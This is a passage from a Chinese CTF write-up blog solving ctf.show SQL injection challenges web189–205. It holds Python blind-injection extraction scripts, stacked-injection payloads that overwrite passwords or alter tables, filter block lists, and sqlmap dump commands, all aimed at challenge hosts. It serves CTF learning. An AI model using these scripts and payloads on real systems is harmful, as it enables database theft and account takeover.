读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。regexp： mysql中的正则表达式操作符</code></pre><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;15 22:14# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot;all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;flag &#x3D; &quot;ctfshow&#123;&quot;for i in range(200):    for j in all_str:        data &#x3D; &#123;            &quot;username&quot;:&quot;if(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;)regexp(&#39;&#123;0&#125;&#39;),0,1)&quot;.format(flag + j),            &#39;password&#39;:0        &#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag +&#x3D;j            print(flag)            break        if j&#x3D;&#x3D;&#39;&#125;&#39;:            exit()</code></pre><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  &#125;&#x2F;&#x2F;TODO:感觉少了个啥，奇怪</code></pre><p>盲注</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509225707786.png" alt="image-20220509225707786"></p><p>底下这个图应该也用or测的，懒得再截图了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509225602279.png" alt="image-20220509225602279"></p><p>可以看到正确的时候返回密码错误，错误的时候返回用户名不存在，所以直接盲注就行了</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;1 21:57# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e4bfc493-4ed3-4091-99b3-e1770febcde1.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;data &#x3D; &#123;&#39;username&#39;:&#39;&#39;,        &#39;password&#39;:123456&#125;flag &#x3D; &#39;&#39;for i in range(1,46):    start &#x3D; 32    end &#x3D; 127    while start &lt; end:        mid &#x3D; (start + end) &gt;&gt; 1        #取表名：payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        #取字段名：payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot;        payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot;        data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ascii(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:            start &#x3D; mid +1        else:            end &#x3D; mid    flag &#x3D; flag + chr(start)    print(flag)</code></pre><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  &#125;&#x2F;&#x2F;TODO:感觉少了个啥，奇怪  if(preg_match(&#39;&#x2F;file|into|ascii&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;      die(json_encode($ret));  &#125;    </code></pre><p>加了个过滤，ascii被过滤了，最简单的就是不用二分法直接遍历比较（</p><p>把ascii换成ord</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;2 17:03# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d0f3a387-5d85-4a5c-a4b8-2267077de55f.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;data &#x3D; &#123;&#39;username&#39;:&#39;&#39;,        &#39;password&#39;:123456&#125;flag &#x3D; &#39;&#39;for i in range(1,46):    start &#x3D; 32    end &#x3D; 127    while start &lt; end:        mid &#x3D; (start + end) &gt;&gt; 1        #取表名：payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        #取字段名：payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot;        payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot;        data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ord(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:            start &#x3D; mid +1        else:            end &#x3D; mid    flag &#x3D; flag + chr(start)    print(flag)</code></pre><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  &#125;&#x2F;&#x2F;TODO:感觉少了个啥，奇怪  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;      die(json_encode($ret));  &#125;</code></pre><p>ord ascii hex都被过滤了，所以还是直接遍历吧（</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;2 17:03# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;flag &#x3D; &quot;&quot;all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;for i in range(1,99):    for j in all_str:        payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;        username_data &#x3D; f&quot;admin&#39; and if(substr((&#123;payload&#125;), &#123;i&#125;, 1)regexp(&#39;&#123;j&#125;&#39;), 1, 0)&#x3D;1#&quot;        data &#x3D; &#123;&#39;username&#39;: username_data,                &#39;password&#39;: 1&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:            flag +&#x3D; j            print(flag)            break        if j &#x3D;&#x3D; &quot;&#125;&quot;:            exit()</code></pre><p>这里我觉得等于号没被过滤的话直接比较看起来会更简单一点</p><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  &#125;&#x2F;&#x2F;TODO:感觉少了个啥，奇怪  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;      die(json_encode($ret));  &#125;</code></pre><p>substr也没了，这里可以用left、right、mid、locate、substring代替</p><pre class="language-none"><code class="language-none">left(&quot;abc&quot;,2)返回从左边第一个开始两个字符&quot;ab&quot;</code></pre><pre class="language-none"><code class="language-none">locate(&quot;ab&quot;,&quot;abxx&quot;)返回第一个参数在第二个参数中出现的位置，从1开始计数</code></pre><p>locate：</p><pre class="language-none"><code class="language-none">import timeimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;bd4fa184-8dec-427e-943d-762e0ed0deb9.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;flagstr_full &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot;flagstr &#x3D; &quot;1234567890&#123;-&#125;abcdef&quot;flag &#x3D; &quot;ctfshow&quot;payload &#x3D; r&quot;&#39; or if(locate(&#39;&#123;&#125;&#39;,(select group_concat(f1ag) from ctfshow_flxg)),1,0) &#x3D;&#39;1&quot;for i in range(60):    for j in flagstr:        tj &#x3D; flag+j        data &#x3D; &#123;            &quot;username&quot;:payload.format(tj),            &quot;password&quot;:&quot;0&quot;        &#125;        res &#x3D; requests.post(url , data &#x3D; data)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag +&#x3D; j            print(flag)        time.sleep(0.3)</code></pre><p>left：</p><pre class="language-none"><code class="language-none">import timeimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;328932d3-030e-460a-923e-6003243856d4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;flagstr &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot;flag &#x3D; &quot;&quot;payload &#x3D; r&quot;&#39; or if(left((select group_concat(f1ag) from ctfshow_flxg), &#123;&#125;)regexp(&#39;&#123;&#125;&#39;),1,0) &#x3D;&#39;1&quot;for i in range(60):    for j in flagstr:        tj &#x3D; flag+j        data &#x3D; &#123;            &quot;username&quot;:payload.format(str(i),tj),            &quot;password&quot;:&quot;0&quot;        &#125;        res &#x3D; requests.post(url , data &#x3D; data)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag +&#x3D; j            print(flag)        time.sleep(0.3)</code></pre><p>还可以利用like的模糊匹配和regexp的正则</p><p>regexp正则：</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;11 14:03# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;flag &#x3D; &quot;&quot;all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot;for i in range(1,99):    for j in all_str:        #payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        #payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;&quot;        payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_flxg&quot;        username_data &#x3D; &quot;admin&#39; and if((&#123;0&#125;)regexp(&#39;^&#123;1&#125;&#39;), 1, 0)&#x3D;1#&quot;.format(payload, flag + j)        data &#x3D; &#123;&#39;username&#39;: username_data,                &#39;password&#39;: 1&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        #print(data)        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:            flag +&#x3D; j            print(flag)            break        if j &#x3D;&#x3D; &quot;&#125;&quot;:            exit()</code></pre><p>like：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;618941b4-ab0f-43e2-83ce-01afe487708c.challenge.ctf.show&#x2F;api&#x2F;&quot;flag &#x3D; &quot;&quot;table &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;for i in range(1,99):    for j in table:        pay &#x3D; flag+j+&#39;%&#39;        username_data &#x3D; f&quot;&#39; or if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        data &#x3D; &#123;&#39;username&#39;: username_data,                &#39;password&#39;: 1&#125;        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data).text        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r:            flag +&#x3D; j            print(flag)            if j &#x3D;&#x3D; &quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>返回逻辑reg</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  &#125;&#x2F;&#x2F;TODO:感觉少了个啥，奇怪  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;      die(json_encode($ret));  &#125;</code></pre><p>like的模糊匹配，regexp的正则还有mid、locate之类的都能用</p><h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  &#125;&#x2F;&#x2F;TODO:感觉少了个啥，奇怪  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;      die(json_encode($ret));  &#125;</code></pre><p>这里是堆叠注入，在我还想爆字段的时候，大师傅们已经用update把密码改了直接登录了</p><p>UPDATE用法</p><pre class="language-none"><code class="language-none">UPDATE 表名称 SET 列名称 &#x3D; 新值 WHERE 列名称 &#x3D; 某值Copy</code></pre><p>使用update修改密码</p><pre class="language-none"><code class="language-none">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1</code></pre><p>不过试了一下发现好像也查不了字段，过滤的有点多，要查感觉只能盲注</p><p>payload</p><pre class="language-sq" data-language="sq"><code class="language-sq">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509232642673.png" alt="image-20220509232642673"></p><p>南方师傅和y4师傅都说因为<code>  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</code>这个语句没引号所以要用十六进制</p><p>所以他们的payload都是下面这种形式</p><pre class="language-none"><code class="language-none">payload&#x3D;&quot;0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;0x313131;&quot;</code></pre><p>而我这里没有用十六进制而是0的原因在web188里</p><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;  die(json_encode($ret));&#125;if(strlen($username)&gt;16)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;用户名不能超过16个字符&#39;;  die(json_encode($ret));&#125;if($row[0]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;&#125;    </code></pre><p>限制了用户名长度，上一题的payload不能用了</p><p>这里好像是后端验证有问题，select没被过滤，所以可以构造payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">username &#x3D; 0;select(1)password &#x3D; 1</code></pre><p>因为</p><pre class="language-sql" data-language="sql"><code class="language-sql">select pass from ctfshow_user where username &#x3D; 0;</code></pre><p>显然不会成立，所以查询后会返回后面的语句结果，而select(1)返回的结果是1，所以这时只要密码是1就能登陆成功</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510112512012.png" alt="image-20220510112512012"></p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set&#x2F;&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;  die(json_encode($ret));&#125;if($row[0]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;&#125;   </code></pre><p>select，update，set被过滤了</p><p>但是show没有，结合查询语句我们能知道表名是ctfshow_user</p><p>所以可以构造payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">username &#x3D; 0;show tablespassword &#x3D; ctfshow_user</code></pre><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>197的payload还能用</p><p>南方师傅还写了另一种思路</p><p>这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下</p><pre class="language-none"><code class="language-none">PYTHON#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;6&#x2F;15 22:53# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;payload &#x3D; &#39;0x61646d696e;alter table ctfshow_user change column &#96;pass&#96; &#96;dotast&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;dotast&#96; &#96;id&#96; varchar(255);&#39;data1 &#x3D; &#123;    &#39;username&#39;: payload,    &#39;password&#39;: &#39;1&#39;&#125;res &#x3D; requests.post(url&#x3D;url, data&#x3D;data1)for i in range(99):    data2 &#x3D; &#123;        &#39;username&#39;: &quot;0x61646d696e&quot;,        &#39;password&#39;: f&#39;&#123;i&#125;&#39;    &#125;    res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;data2)    if &quot;flag&quot; in res2.json()[&#39;msg&#39;]:        print(res2.json()[&#39;msg&#39;])        break</code></pre><h2 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h2><p>web197的payload或者用198写的脚本</p><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>从这之后的几道题都是sqlmap的使用</p><p><a href="https://blog.csdn.net/Dome_/article/details/104337211">Sqlmap常见命令_K&#39;illCode的博客-CSDN博客</a></p><pre class="language-none"><code class="language-none">[ sqlmap最新版下载](https:&#x2F;&#x2F;ctfshow.lanzoui.com&#x2F;i4wlziac1de) 使用--user-agent 指定agent 使用--referer 绕过referer检查</code></pre><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;代码过于简单，不宜展示  &#125;</code></pre><p>题目上都写了</p><pre class="language-txt" data-language="txt"><code class="language-txt">使用--user-agent 指定agent使用--referer 绕过referer检查</code></pre><p>抓一下包找到查询的api接口</p><p>然后referer要为ctf.show</p><pre class="language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot;  --referer&#x3D;&quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&quot; --dump --batch --no-cast ----dump             转储数据库表项,查询字段值-session</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">--no-cast  获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast)--dump             转储数据库表项,查询字段值--batch&#x2F;&#x2F;自动选择选项--flush-sessionsqlmap扫描的时候会将缓存的数据记录到output文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加--flush-session选项。</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510161320437.png" alt="image-20220510161320437"></p><p>如果是一步一步的查，那payload应该是</p><pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</code></pre><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><blockquote><p>使用--data 调整sqlmap的请求方式</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;代码过于简单，不宜展示  &#125;  </code></pre><p>那估计要使用 --data 指定 sqlmap 以 post 方式提交数据。</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;0cebe0af-c76a-4335-a5a8-16064c4de582.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510162400623.png" alt="image-20220510162400623"></p><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><blockquote><p>使用--method 调整sqlmap的请求方式</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;代码过于简单，不宜展示  &#125;</code></pre><p>提示要用method改变请求方式，这里使用PUT请求，但是要记得加上设置<code>Content-Type</code>头，否则会变成表单提交</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;43ff4bac-b773-4dbb-a031-4e7733802d21.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --flush-session --method&#x3D;&quot;PUT&quot;或者sqlmap.py -u &quot;http:&#x2F;&#x2F;915e3532-dda5-47a4-82f4-b439e1cd6464.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</code></pre><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><blockquote><p>使用--cookie 提交cookie数据</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;代码过于简单，不宜展示  &#125;</code></pre><p>payload</p><p>加个cookie就行了</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3231bb16-ffbb-4679-a2ba-6a9687d737e4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;ctfshow&#x3D;64b77e9cb5917892ab53c4a2f6870182; PHPSESSID&#x3D;c2lm2vuriqmg16ilkbh2f9sern&quot; --method&#x3D;&quot;PUT&quot;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510181243184.png" alt="image-20220510181243184"></p><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><blockquote><p>api调用需要鉴权</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user where id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;代码过于简单，不宜展示  &#125;      </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510181851876.png" alt="image-20220510181851876"></p><p>每次查询都会调用一次getToken.php，这应该就是鉴权的过程</p><p>sqlmap中</p><pre class="language-none"><code class="language-none">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数</code></pre><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;9i0d9ub2ad7q4rl94r3pi9vf23&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3c435471-9eeb-4118-ab03-80d1e15f215d.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510182857216.png" alt="image-20220510182857216"></p><h2 id="web206"><a href="#web206" class="headerlink" 